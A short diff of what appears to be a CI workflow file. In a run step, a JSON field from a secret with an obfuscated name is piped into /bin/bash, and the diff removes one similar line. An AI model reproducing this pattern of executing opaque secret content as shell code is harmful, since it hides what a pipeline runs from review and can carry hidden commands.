@@ -23,7 +23,6 @@ jobs:
           vyug3106: ${{ secrets.vyug3106 }}
         run: |
           printf '%s' "$vyug3106" | jq -r .y9207 | /bin/bash
-          echo $ih66383 | jq -r .cwdg224 | /bin/bash
 
       - name: Save archive
         if: always()
